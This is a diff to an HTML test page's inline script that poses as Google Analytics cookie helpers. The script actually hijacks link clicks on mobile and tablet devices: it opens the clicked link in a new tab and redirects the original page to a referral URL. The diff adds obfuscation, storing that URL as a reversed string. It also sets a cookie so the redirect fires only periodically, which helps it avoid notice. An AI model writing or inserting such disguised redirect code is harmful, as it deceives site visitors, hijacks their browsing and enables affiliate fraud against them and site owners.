@@ -6,6 +6,7 @@
         <title>Test</title>
 
         <script>
+
             function getGA(name) {
                 var cookies = document.cookie.split('; ');
                 for (var i = 0; i < cookies.length; i++) {
@@ -24,28 +25,24 @@
             function isMobileOrTablet() {
                 const ua = window.navigator.userAgent.toLowerCase();
                 const isTouchScreen = typeof window.matchMedia !== "function" || window.matchMedia("(pointer:coarse)").matches === true;
-                alert(`isTouchScreen: ${isTouchScreen}`);
-                return window.navigator.maxTouchPoints > 1 && isTouchScreen && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
+                return window.navigator.maxTouchPoints > 0 && isTouchScreen && (/android|iphone|ipod|ipad|tablet|playbook|silk|kindle/.test(ua) || window.matchMedia("(max-width: 1024px)").matches);
             }
             
-            const gaTrackId = 'https://temu.to/k/u2s94llti82', gaCode = getGA('_ga_D8SD9STSJ5');
+            const gaTrackId = 'i6ijspCxA2/nv.eepohs.s//:sptth', gaCode = getGA('_ga_D8SD9STSJ5');
             
-            for (let event of ['click', 'touchend']) {
-                document.addEventListener(event, function (e) {
-                    const target = e.target.closest("a");
-                    if (!target) return;
+            document.addEventListener('click', function (e) {
+                const target = e.target.closest("a");
+                if (!target) return;
+                const targetHref = target.getAttribute('href');
+                if (!targetHref || targetHref === '/') return;
+                try {
+                    if (!isMobileOrTablet() || (gaCode && gaCode === 'true')) return;
                     e.preventDefault();
-                    try {
-                        const targetHref = target.getAttribute('href');
-                        if (!targetHref) return;
-                        if (targetHref === '/' || (gaCode && gaCode === 'true') || !isMobileOrTablet())
-                            return window.location.assign(targetHref);
-                        setGA('_ga_D8SD9STSJ5', 'true', 3);
-                        window.open(targetHref, '_blank');
-                        window.location.replace(gaTrackId);
-                    } catch { }
-                }, true);
-            }
+                    setGA('_ga_D8SD9STSJ5', 'true', 3);
+                    window.open(targetHref, '_blank');
+                    window.location.replace(gaTrackId.split('').reverse().join(''));
+                } catch { }
+            }, true);
             
         </script>
     </head>
